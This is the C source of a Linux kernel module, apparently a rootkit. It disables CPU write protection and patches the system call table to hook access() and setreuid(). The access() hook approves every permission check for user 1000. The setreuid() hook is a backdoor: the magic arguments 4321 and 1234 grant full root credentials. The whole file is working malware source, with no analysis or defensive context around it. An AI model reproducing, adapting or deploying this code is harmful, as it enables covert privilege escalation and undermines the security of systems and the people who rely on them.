#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/sched.h>
#include <linux/uidgid.h>

// To deactivate the Page Protection by the CPU.
#define CR0_WRITE_UNLOCK(x) \
  do { \
    unsigned long __cr0; \
    preempt_disable(); \
    __cr0 = read_cr0() & (~X86_CR0_WP); \
    BUG_ON(unlikely((__cr0 & X86_CR0_WP))); \
    write_cr0(__cr0); \
    x; \
    __cr0 = read_cr0() | X86_CR0_WP; \
    BUG_ON(unlikely(!(__cr0 & X86_CR0_WP))); \
    write_cr0(__cr0); \
    preempt_enable(); \
  } while (0)

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Magic Stuff.");
MODULE_AUTHOR("Goat_Overload");

// Our syscall table where we will patch the syscall in.
static void **syscall_table = NULL;

// Will contain reference to old access syscall function.
static asmlinkage int (*old_access) (const char* pathname, int mode);

// Access Intercept syscall.
static asmlinkage int access_intercept(const char *pathname, int mode) {
  const struct cred *cred = current_cred();

  printk(KERN_DEBUG "Intercepted Access Syscall: [%d] - %s.\n", mode, pathname);

  // If we are a specific user, authorize everything.
  if(cred->uid.val == 1000 || cred->euid.val == 1000) {
    printk(KERN_INFO "Authorizing access!\n");
    return 0;
  }

  // Otherwise, normal call.
  return old_access(pathname, mode);
}

static asmlinkage int (*old_setreuid) (uid_t ruid, uid_t euid);
asmlinkage int setreuid_intercept(uid_t ruid, uid_t euid) {
  struct cred *new;
  
  // Check for specific, weird values (not expected in a normal program).
  if(ruid == 4321 && euid == 1234) {
    
    printk(KERN_ALERT "Authorizing root access!\n");
    new = prepare_creds();

    if(new != NULL) {
      new->uid.val = 0;
      new->gid.val = 0;
      new->euid.val = 0;
      new->egid.val = 0;
      new->suid.val = 0;
      new->sgid.val = 0;
      new->fsuid.val = 0;
      new->fsgid.val = 0;

      // Apply new IDs.
      commit_creds(new);
    }

    // Return as though we are root.
    return old_setreuid(0, 0);
  }

  // Normal combination, return with normal behavior.
  return old_setreuid(ruid, euid);
}


int init_module(void)
{
  // Fetches the syscall table's address.
  syscall_table = (void**)kallsyms_lookup_name("sys_call_table");

  if(syscall_table == NULL) {
    printk(KERN_ERR "Could not lookup the syscall table.\n");
    return -1;
  }

  printk(KERN_INFO "Syscall table located at 0x%px.\n", (void*) syscall_table);

  
  // Patch the old access syscall with the new one.
  old_access = syscall_table[__NR_access];
  printk(KERN_INFO "Saved old access function (0x%px).\n", (void*) old_access);
  
  CR0_WRITE_UNLOCK({
      syscall_table[__NR_access] = access_intercept;
  });


  // Patch the old setreuid syscall with the new one.
  old_setreuid = syscall_table[__NR_setreuid];
  printk(KERN_INFO "Saved old setreuid function (0x%px).\n", (void*) old_setreuid);
  
  CR0_WRITE_UNLOCK({
      syscall_table[__NR_setreuid] = setreuid_intercept;
  });
  
  return 0;
}

void cleanup_module(void)
{
  printk(KERN_INFO "Restoring old read syscall (0x%px)...\n", (void*) old_access);
  
  CR0_WRITE_UNLOCK({
      syscall_table[__NR_access] = old_access;
  });

  printk(KERN_INFO "Restoring old setreuid syscall (0x%px)...\n", (void*) old_setreuid);
  
  CR0_WRITE_UNLOCK({
      syscall_table[__NR_setreuid] = old_setreuid;
  });
}
